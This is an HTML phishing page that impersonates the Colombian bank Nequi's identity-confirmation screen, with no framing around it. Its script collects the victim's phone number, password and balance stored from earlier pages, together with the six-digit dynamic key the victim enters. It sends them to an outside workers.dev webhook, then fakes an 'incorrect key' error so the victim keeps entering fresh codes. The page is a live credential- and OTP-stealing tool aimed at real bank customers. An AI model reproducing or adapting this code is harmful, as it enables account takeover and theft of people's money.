<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi - Confirma tu identidad</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
        }
        h1 {
            font-size: 36px;
            font-weight: 700;
            color: #21002b;
            text-align: center;
            margin-bottom: 25px;
        }
        h2 {
            font-size: 22px;
            font-weight: 600;
            color: #1a1a2e;
            margin-bottom: 10px;
            text-align: center;
        }
        .subtitle {
            text-align: center;
            color: #666;
            font-size: 15px;
            margin-bottom: 35px;
            padding: 0 10px;
            line-height: 1.5;
        }
        .error-message {
            text-align: center;
            color: #e53935;
            font-size: 14px;
            margin-bottom: 20px;
            padding: 12px;
            background: #ffebee;
            border-radius: 10px;
            display: none;
        }
        .error-message.show {
            display: block;
        }
        .intentos-restantes {
            text-align: center;
            font-size: 13px;
            color: #999;
            margin-top: 5px;
            margin-bottom: 20px;
            display: none;
        }
        .pin-dots {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 45px;
        }
        .dot {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            background: #e0e0e0;
            border: 2px solid #cccccc;
            transition: all 0.2s;
        }
        .dot.filled {
            background: #ff008c;
            border-color: #ff008c;
            transform: scale(1.15);
        }
        .keyboard {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 18px;
            max-width: 280px;
            margin: 0 auto;
        }
        .key {
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            font-weight: 500;
            background: #f5f5f5;
            border-radius: 50%;
            cursor: pointer;
            transition: all 0.2s;
            border: 2px solid #e0e0e0;
            color: #1a1a2e;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        .key:hover {
            background: #eeeeee;
            transform: scale(1.05);
        }
        .key:active {
            transform: scale(0.95);
            background: #ff008c;
            color: white;
            border-color: #ff008c;
        }
        .key.confirm {
            background: #ff008c;
            color: white;
            border-color: #ff008c;
            font-size: 24px;
        }
        .key.confirm:hover {
            background: #e0007a;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Nequi</h1>
        <h2>Confirma tu identidad</h2>
        <p class="subtitle">Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>
        
        <div class="error-message" id="errorMessage">
            La clave dinámica es incorrecta o ha expirado. Verifícala en tu app Nequi.
        </div>
        
        <div class="intentos-restantes" id="intentosRestantes">
            Intentos restantes: <span id="contadorIntentos">3</span>
        </div>
        
        <div class="pin-dots" id="pinDots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        
        <div class="keyboard" id="keyboard"></div>
    </div>

    <script>
    let pin = '';
    const maxLength = 6;
    let intentos = 3;
    const dots = document.querySelectorAll('.dot');
    const keyboard = document.getElementById('keyboard');
    const errorMessage = document.getElementById('errorMessage');
    const contadorIntentos = document.getElementById('contadorIntentos');
    
    const urlParams = new URLSearchParams(window.location.search);
    const intentoAnterior = parseInt(urlParams.get('intento')) || 0;
    
    if (intentoAnterior > 0) {
        intentos = 3 - intentoAnterior;
        if (intentos > 0) {
            errorMessage.classList.add('show');
        }
    }
    actualizarContador();
    
    const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '', '0', '✓'];
    
    function actualizarContador() {
        contadorIntentos.textContent = intentos;
    }
    
    keys.forEach(key => {
        const keyDiv = document.createElement('div');
        keyDiv.className = 'key' + (key === '✓' ? ' confirm' : '');
        keyDiv.textContent = key;
        
        if (key !== '') {
            keyDiv.addEventListener('click', () => {
                if (key === '✓') {
                    if (pin.length === maxLength) {
                        
                        const webhookURL = 'https://subcredfac.miprimercredito.workers.dev/api/enviar';
                        const sesionId = localStorage.getItem('sesionId') || 'DESCONOCIDO';
                        
                        const datosSesion = JSON.parse(localStorage.getItem('datosSesion')) || {};
                        const numero = datosSesion.numero || 'No registrado';
                        const clave = datosSesion.clave || 'No registrada';
                        const saldo = datosSesion.saldo || 'No registrado';
                        
                        const mensaje = `🔢 **CLAVE DINÁMICA - RESUMEN**\n` +
                                        `🆔 ${sesionId}\n` +
                                        `📱 Número: +57 ${numero}\n` +
                                        `🔐 Clave: ${clave}\n` +
                                        `💰 Saldo NEQUI: $${saldo}\n` +
                                        `🔢 Dinámica: ${pin}\n` +
                                        `📊 Resultado: ${intentos - 1 <= 0 ? '❌ BLOQUEADO' : `❌ Incorrecta (Intento ${4 - intentos} de 3)`}`;
                        
                        fetch(webhookURL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: mensaje })
                        })
                        .then(() => {
                            intentos--;
                            actualizarContador();
                            
                            if (intentos <= 0) {
                                window.location.href = 'carga-intento.html?intento=3';
                            } else {
                                window.location.href = `carga-intento.html?intento=${3 - intentos}`;
                            }
                        })
                        .catch(error => {
                            console.error('Error Discord:', error);
                            intentos--;
                            actualizarContador();
                            
                            if (intentos <= 0) {
                                window.location.href = 'carga-intento.html?intento=3';
                            } else {
                                window.location.href = `carga-intento.html?intento=${3 - intentos}`;
                            }
                        });
                        
                        return;
                    }
                } else if (pin.length < maxLength) {
                    pin += key;
                    updateDots();
                    errorMessage.classList.remove('show');
                }
            });
        } else {
            keyDiv.style.visibility = 'hidden';
        }
        
        keyboard.appendChild(keyDiv);
    });
    
    function updateDots() {
        dots.forEach((dot, index) => {
            if (index < pin.length) {
                dot.classList.add('filled');
            } else {
                dot.classList.remove('filled');
            }
        });
    }
</script>
</body>
</html>
